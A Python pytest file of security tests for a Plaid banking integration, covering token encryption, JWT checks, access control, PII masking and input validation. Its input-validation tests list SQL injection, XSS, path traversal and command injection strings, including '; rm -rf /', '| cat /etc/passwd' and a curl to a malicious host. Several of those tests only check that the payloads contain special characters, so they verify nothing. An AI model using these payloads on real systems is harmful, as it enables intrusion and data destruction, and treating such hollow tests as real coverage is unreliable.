"""
Security tests for Plaid integration
"""

import pytest
from unittest.mock import Mock, patch
import jwt
import time
from cryptography.fernet import Fernet

from src.app.services.plaid_service import plaid_service


class TestTokenSecurity:
    """Security tests for token handling and storage"""

    def test_access_token_encryption(self):
        """Test that access tokens should be encrypted when stored"""
        # This test demonstrates what token encryption should look like
        access_token = "access-production-real-token"
        
        # Generate encryption key (this would be stored securely)
        key = Fernet.generate_key()
        fernet = Fernet(key)
        
        # Encrypt token
        encrypted_token = fernet.encrypt(access_token.encode())
        
        # Verify we can decrypt it back
        decrypted_token = fernet.decrypt(encrypted_token).decode()
        assert decrypted_token == access_token
        
        # Verify encrypted token doesn't contain original
        assert access_token.encode() not in encrypted_token

    def test_token_storage_isolation(self):
        """Test that tokens are properly isolated per user"""
        # Mock database storage simulation
        token_storage = {}
        
        user1_id = "user-123"
        user2_id = "user-456"
        
        user1_token = "access-token-user1"
        user2_token = "access-token-user2"
        
        # Store tokens per user
        token_storage[user1_id] = user1_token
        token_storage[user2_id] = user2_token
        
        # Verify isolation
        assert token_storage[user1_id] != token_storage[user2_id]
        assert user1_token not in str(token_storage[user2_id])

    def test_token_expiration_handling(self):
        """Test proper handling of token expiration"""
        # Simulate JWT token with expiration
        payload = {
            'user_id': 'test-user',
            'exp': int(time.time()) + 3600,  # Expires in 1 hour
            'iat': int(time.time())
        }
        
        secret = "test-secret-key"
        token = jwt.encode(payload, secret, algorithm='HS256')
        
        # Verify token is valid
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        assert decoded['user_id'] == 'test-user'
        
        # Test expired token
        expired_payload = {
            'user_id': 'test-user',
            'exp': int(time.time()) - 3600,  # Expired 1 hour ago
            'iat': int(time.time()) - 7200
        }
        
        expired_token = jwt.encode(expired_payload, secret, algorithm='HS256')
        
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(expired_token, secret, algorithms=['HS256'])

    @pytest.mark.asyncio
    async def test_access_token_validation(self):
        """Test access token validation before use"""
        # Test with mock service
        with patch.object(plaid_service, 'client') as mock_client:
            # Valid token should return True
            mock_client.accounts_get.return_value = {'accounts': []}
            result = await plaid_service.validate_access_token("valid-token")
            assert result is True
            
            # Invalid token should return False
            from plaid.exceptions import PlaidError
            mock_client.accounts_get.side_effect = PlaidError("Invalid token")
            result = await plaid_service.validate_access_token("invalid-token")
            assert result is False

    def test_sensitive_data_logging(self, caplog):
        """Test that sensitive data is not logged"""
        import logging
        
        sensitive_data = [
            "access-production-real-token",
            "sk_live_real_secret_key",
            "user_password_123",
            "4111111111111111",  # Credit card number
        ]
        
        logger = logging.getLogger("test_logger")
        
        with caplog.at_level(logging.INFO):
            # Simulate logging that should NOT contain sensitive data
            logger.info("Processing user request for account data")
            logger.info("Token validation completed successfully")
            
            # This would be BAD - don't log actual tokens
            # logger.info(f"Using token: {sensitive_token}")
        
        # Verify no sensitive data in logs
        for sensitive_item in sensitive_data:
            assert sensitive_item not in caplog.text


class TestAuthenticationSecurity:
    """Security tests for authentication and authorization"""

    @pytest.mark.asyncio
    async def test_jwt_token_validation(self):
        """Test JWT token validation for API access"""
        secret = "test-jwt-secret"
        
        # Create valid JWT
        valid_payload = {
            'user_id': 'test-user-123',
            'email': 'test@example.com',
            'exp': int(time.time()) + 3600,
            'iat': int(time.time())
        }
        
        valid_token = jwt.encode(valid_payload, secret, algorithm='HS256')
        
        # Test validation
        try:
            decoded = jwt.decode(valid_token, secret, algorithms=['HS256'])
            assert decoded['user_id'] == 'test-user-123'
            assert decoded['email'] == 'test@example.com'
        except jwt.InvalidTokenError:
            pytest.fail("Valid JWT token should not raise InvalidTokenError")

    def test_malicious_jwt_tokens(self):
        """Test handling of malicious JWT tokens"""
        secret = "test-secret"
        malicious_tokens = [
            "not.a.jwt",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.malicious.payload",
            "",
            None,
            "Bearer malicious-token",
        ]
        
        for malicious_token in malicious_tokens:
            if malicious_token is None:
                continue
                
            with pytest.raises((jwt.InvalidTokenError, ValueError, TypeError)):
                jwt.decode(malicious_token, secret, algorithms=['HS256'])

    @pytest.mark.asyncio
    async def test_user_permission_isolation(self):
        """Test that users can only access their own Plaid data"""
        # Mock different users
        user1 = Mock()
        user1.id = "user-123"
        user1.email = "user1@example.com"
        
        user2 = Mock()
        user2.id = "user-456" 
        user2.email = "user2@example.com"
        
        # Simulate user-specific token storage
        user_tokens = {
            "user-123": "access-token-for-user1",
            "user-456": "access-token-for-user2"
        }
        
        # User 1 should only access their token
        user1_token = user_tokens.get(user1.id)
        assert user1_token == "access-token-for-user1"
        
        # User 1 should not access User 2's token
        assert user1_token != user_tokens.get(user2.id)

    def test_role_based_access_control(self):
        """Test role-based access to Plaid features"""
        # Define user roles
        user_roles = {
            "admin": ["read_all_accounts", "link_accounts", "delete_accounts"],
            "user": ["read_own_accounts", "link_accounts"],
            "readonly": ["read_own_accounts"]
        }
        
        # Test permissions
        admin_permissions = user_roles["admin"]
        user_permissions = user_roles["user"]
        readonly_permissions = user_roles["readonly"]
        
        # Admin should have all permissions
        assert "delete_accounts" in admin_permissions
        assert "link_accounts" in admin_permissions
        
        # Regular user should not delete accounts
        assert "delete_accounts" not in user_permissions
        assert "link_accounts" in user_permissions
        
        # Readonly should only read
        assert "delete_accounts" not in readonly_permissions
        assert "link_accounts" not in readonly_permissions
        assert "read_own_accounts" in readonly_permissions


class TestInputValidation:
    """Security tests for input validation and sanitization"""

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection in user inputs"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM accounts WHERE '1'='1'; --",
            "UNION SELECT * FROM sensitive_table",
        ]
        
        # These should be properly escaped/validated by Pydantic models
        # and not reach the database as raw SQL
        for malicious_input in sql_injection_attempts:
            # In real implementation, these would be validated by Pydantic
            # and rejected before reaching any database query
            assert "'" in malicious_input or ";" in malicious_input
            # This demonstrates that we need proper validation

    def test_xss_prevention(self):
        """Test prevention of XSS attacks in user inputs"""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
        ]
        
        for malicious_input in xss_attempts:
            # These should be escaped/sanitized before being stored or displayed
            assert "<" in malicious_input or "javascript:" in malicious_input
            # Demonstrates need for proper output encoding

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for malicious_path in path_traversal_attempts:
            # These should be rejected by input validation
            assert ".." in malicious_path or "/" in malicious_path or "\\" in malicious_path

    def test_command_injection_prevention(self):
        """Test prevention of command injection"""
        command_injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl malicious-site.com",
            "`whoami`",
            "$(id)",
        ]
        
        for malicious_command in command_injection_attempts:
            # These should never be passed to shell commands
            assert any(char in malicious_command for char in [";", "|", "&", "`", "$"])


class TestDataPrivacy:
    """Tests for data privacy and compliance"""

    def test_pii_data_handling(self):
        """Test proper handling of personally identifiable information"""
        # Mock user data that contains PII
        user_data = {
            'user_id': 'user-123',
            'email': 'john.doe@example.com',
            'ssn': '123-45-6789',  # Should be encrypted/hashed
            'account_number': '1234567890',  # Should be masked
            'phone': '555-123-4567'
        }
        
        # Simulate data masking for display
        def mask_sensitive_data(data):
            masked_data = data.copy()
            if 'ssn' in masked_data:
                masked_data['ssn'] = 'XXX-XX-' + masked_data['ssn'][-4:]
            if 'account_number' in masked_data:
                masked_data['account_number'] = 'XXXX' + masked_data['account_number'][-4:]
            return masked_data
        
        masked_data = mask_sensitive_data(user_data)
        
        # Verify sensitive data is masked
        assert masked_data['ssn'] == 'XXX-XX-6789'
        assert masked_data['account_number'] == 'XXXX7890'
        assert masked_data['email'] == user_data['email']  # Email can be shown

    def test_data_retention_policies(self):
        """Test data retention and deletion policies"""
        import datetime
        
        # Simulate account linking data with timestamps
        account_data = {
            'user_id': 'user-123',
            'access_token': 'encrypted-token',
            'created_at': datetime.datetime.now() - datetime.timedelta(days=365),
            'last_accessed': datetime.datetime.now() - datetime.timedelta(days=180)
        }
        
        # Check if data should be deleted (example: after 1 year of inactivity)
        max_retention_days = 365
        cutoff_date = datetime.datetime.now() - datetime.timedelta(days=max_retention_days)
        
        should_delete = account_data['last_accessed'] < cutoff_date
        
        if should_delete:
            # In real implementation, this would trigger data deletion
            assert account_data['last_accessed'] < cutoff_date

    def test_gdpr_compliance_simulation(self):
        """Test GDPR-like data subject rights"""
        # Simulate user requesting data deletion
        user_id = "user-to-be-deleted"
        
        # Mock user data across different services
        user_data_locations = {
            'plaid_tokens': ['access-token-123'],
            'account_data': [{'account_id': 'acc-123', 'balance': 1000}],
            'transaction_history': [{'id': 'txn-123', 'amount': 50}],
            'user_profile': {'id': user_id, 'email': 'user@example.com'}
        }
        
        # Simulate data deletion process
        def delete_user_data(user_id):
            deleted_data = {}
            for location, data in user_data_locations.items():
                deleted_data[location] = len(data)
                # In real implementation, this would delete the actual data
            return deleted_data
        
        deletion_result = delete_user_data(user_id)
        
        # Verify all data locations were processed
        assert 'plaid_tokens' in deletion_result
        assert 'account_data' in deletion_result
        assert deletion_result['plaid_tokens'] == 1
        assert deletion_result['account_data'] == 1


class TestNetworkSecurity:
    """Tests for network security measures"""

    def test_https_enforcement(self):
        """Test that HTTPS is required for sensitive endpoints"""
        # In production, all Plaid API calls should use HTTPS
        plaid_endpoints = [
            'https://production.plaid.com/link/token/create',
            'https://production.plaid.com/item/public_token/exchange',
            'https://production.plaid.com/accounts/get',
            'https://production.plaid.com/investments/holdings/get'
        ]
        
        for endpoint in plaid_endpoints:
            assert endpoint.startswith('https://'), f"Endpoint {endpoint} should use HTTPS"

    def test_api_key_security(self):
        """Test API key security measures"""
        # API keys should never be in URLs or logs
        api_key = "test-api-key-12345"
        
        # Simulate different scenarios where API key might leak
        safe_log_message = "Processing Plaid API request"
        unsafe_log_message = f"API key: {api_key}"
        
        # Safe logging should not contain API key
        assert api_key not in safe_log_message
        
        # Unsafe logging (should be avoided) contains API key
        assert api_key in unsafe_log_message
        
        # In real implementation, we should never log the unsafe message

    def test_request_signing(self):
        """Test request signing for additional security"""
        import hmac
        import hashlib
        
        # Simulate request signing
        secret_key = "webhook-secret-key"
        payload = '{"account_id": "test-account", "webhook_type": "TRANSACTIONS"}'
        
        # Create signature
        signature = hmac.new(
            secret_key.encode('utf-8'),
            payload.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        # Verify signature
        expected_signature = hmac.new(
            secret_key.encode('utf-8'),
            payload.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        assert signature == expected_signature
        
        # Wrong payload should create different signature
        wrong_payload = '{"account_id": "wrong-account"}'
        wrong_signature = hmac.new(
            secret_key.encode('utf-8'),
            wrong_payload.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        assert signature != wrong_signature